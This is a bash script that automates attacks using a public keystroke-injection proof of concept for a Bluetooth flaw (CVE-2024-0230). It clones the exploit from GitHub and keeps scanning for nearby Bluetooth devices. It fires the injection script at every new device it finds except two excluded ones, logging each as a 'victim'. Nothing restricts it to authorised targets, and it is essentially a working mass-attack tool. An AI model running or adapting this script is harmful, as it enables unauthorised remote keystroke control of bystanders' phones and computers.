#!/bin/bash
clear
#set -x
#------------------------------------------------
# Banner for the 1337'ishness
#------------------------------------------------
cat << "EOF"

HELPER SCRIPT FOR TESTING THE
BLUETOOTH POC CVE-2024-0230 

EOF
#------------------------------------------------
# Variables
#------------------------------------------------
RFKILL="/usr/sbin/rfkill"
HCITOOL="/usr/bin/hcitool"
HCICONFIG="/usr/bin/hciconfig"
#------------------------------------------------
# Arrays
#------------------------------------------------
declare -A mac_list     # Found MAC addresses and their associated data
declare -A exclude_list # Exclude MAC addresses
declare -A victims_list # List of victims we have attacked
#------------------------------------------------
# Exclude list of MAC's NOT to attack
#------------------------------------------------
exclude_list["58:1C:F8:09:9A:F2"]=1 # Illuminati-PC
exclude_list["78:64:C0:1E:FA:42"]=1 # Illuminati-4G
#------------------------------------------------
# PRE
#------------------------------------------------
# Only run as user root
if  [ ${UID} -ne 0 ]; then 
 printf "\n### ERROR - This script must run as user root (or with sudo)\n\n"
 exit 1
fi
# Ensure script is run with a bash version that supports associative arrays
if [[ "${BASH_VERSINFO:-0}" -lt 4 ]]; then
 echo "Bash version 4.0 or later is required."
 exit 1
fi
# Install needed utils
for PACKET in python3-bluez python3-pydbus rfkill bluez git; do 
 if [ $(dpkg -l ${PACKET} 2>/dev/null | grep -c "^ii  ${PACKET}") -eq 0 ]; then 
  printf "%-50s" "Installing ${PACKET}"
  apt-get update -qq -y > /dev/null 2>&1 & apt-get install -y -qq ${PACKET} > /dev/null 2>&1
  if [ $(dpkg -l ${PACKET} 2>/dev/null | grep -c "^ii  ${PACKET}") -eq 0 ]; then 
   echo "[FAILED]"
   printf "\nInstallation of ${PACKET} failed!\n\n"
   exit 1
  else
   echo "[OK]"
  fi
 fi
done
# Check if utilities exist
for UTIL in ${HCITOOL} ${HCICONFIG} ${RFKILL}; do
 if [ ! -x ${UTIL} ]; then 
  printf "\n### ERROR - Could not find ${UTIL}\n\n"
  exit 1
 fi
done
#------------------------------------------------
# Download POC scripts
#------------------------------------------------
if [ ! -d hi_my_name_is_keyboard ]; then 
 printf "%-50s" "Git-Cloning /marcnewlin/hi_my_name_is_keyboard"
 git clone -q https://github.com/marcnewlin/hi_my_name_is_keyboard 
 echo "[OK]"
fi
cd hi_my_name_is_keyboard
#------------------------------------------------
# TRAP
#------------------------------------------------
trap '
 printf -- "\n--------------------------------------------------------------------------------------\n"
 printf "$(date) - Attack stopped\n"
 printf -- "--------------------------------------------------------------------------------------\n"
 if [ ${STOP_BLUETOOTH:-0} -ne 0 ]; then 
  systemctl stop bluetooth > /dev/null 2>&1
 fi
 if [ ${#mac_list[@]} -ne 0 ]; then
  printf "\nSummary of Attacked Devices:\n"
  printf -- "--------------------------------------------------------------------------------------\n"
  for mac in "${!mac_list[@]}"; do
   echo "MAC: $mac Data: ${mac_list[$mac]}"
  done
  printf -- "--------------------------------------------------------------------------------------\n"
 fi
' exit
#------------------------------------------------
# MAIN
#------------------------------------------------
# Start bluetooth service
if [ $(systemctl is-active bluetooth|grep -c ^active) -eq 0 ]; then 
 printf "%-50s" "Startng bluetooth service"
 STOP_BLUETOOTH=1
 systemctl start bluetooth > /dev/null 2>&1
 if [ $(systemctl is-active bluetooth|grep -c ^active) -eq 0 ]; then 
  echo "[FAILED]"
  exit 1
 fi
 echo "[OK]"
fi
#------------------------------------------------
# Rfkill Unblock bluetoooth
#------------------------------------------------
if [ $(${RFKILL} --noheadings -o SOFT,HARD list bluetooth|tr ' ' '\n'|grep -v ^$|grep -c ^blocked) -ne 0 ]; then 
 printf "%-50s" "Running \"rfkill unblock bluetooth\""
 ${RFKILL} unblock bluetooth > /dev/null 2>&1
 echo "[OK]"
fi
sleep 1
#------------------------------------------------
# Ensure HCI device is up (on)
#------------------------------------------------
activated=0
for HCI in $(${HCICONFIG}|grep ^hci|cut -d ':' -f1|awk '{print $1}'); do 
 ${HCICONFIG} ${HCI} up > /dev/null 2>&1
 ((activated++))
done
if [ ${activated:-0} -eq 0 ]; then 
 printf "### An error occoured - HCI device not responding\n\n"
 exit 1
fi
#------------------------------------------------
# FUNCTIONS
#------------------------------------------------
is_this_a_known_mac() { # Function to check if a MAC address is in the array
 local mac=$1
 [[ -n "${mac_list[$mac]}" ]]
}
#------------------------------------------------
# SCAN AND EXPLOIT
#------------------------------------------------
echo ""
printf -- "--------------------------------------------------------------------------------------\n"
printf "$(date) - Starting attack\n"
printf -- "--------------------------------------------------------------------------------------\n"
attacked=0
printf "%-50s %10s uniq, %s new %s attacked" "$(date) - Device(s) found:" "0" "0" "0"
while true; do
 scanning_data=$(${HCITOOL} scan | grep -v ^Scanning) # Perform the scan and filter out the header line
 new_macs_found=0
 while IFS= read -r line; do # Process each found MAC address and format it
  formatted_line=$(echo "$line" | sed -E 's/^[[:space:]]*([0-9A-F:]{17})[[:space:]]*(.*)$/\1,\2/')
  mac=$(echo "$formatted_line" | awk -F, '{print $1}')
  data=$(echo "$formatted_line" | awk -F, '{print $2}')
  if [[ -n "$mac" && -n "$data" ]]; then
   if ! is_this_a_known_mac "$mac"; then 
    mac_list["$mac"]="$data"
    ((new_macs_found++))
    NEW=1
   fi
  fi
 done <<< "$scanning_data"
 #------------------------------------------------
 if [ ${#mac_list[@]} -ne 0 ] && [ ${NEW:-0} -eq 1 ]; then
  if [ ! -n "${exclude_list[$mac]}" ] && [ ! -n "${victims_list[$mac]}" ] ; then
   NEW=0
   printf "\n%-50s %10s uniq, %s new %s attacked" "$(date) - Device(s) found:" "${#mac_list[@]}" "${new_macs_found}" "${attacked}"
   #------------------------------------------------
   # Attack
   #------------------------------------------------
   for HCI in $(${HCICONFIG}|grep ^hci|cut -d ':' -f1|awk '{print $1}'); do 
   printf "\n\n%-50s\n" "Attacking ${mac} | ${data}"
   ((attacked++))
   printf -- "--------------------------------------------------------------------------------------\n"
   timeout 30 ./keystroke-injection-android-linux.py -i ${HCI} -t ${mac}
   victims_list["${mac}"]=1 # Add the target to the victims list so we do not attack them more than 1 time.
   printf "\n"
   printf "%-50s %10s uniq, %s new %s attacked" "$(date) - Device(s) found:" "${#mac_list[@]}" "0" "${attacked}"
   done
  fi
 fi
done
#------------------------------------------------
# END OF SCRIPT
#------------------------------------------------
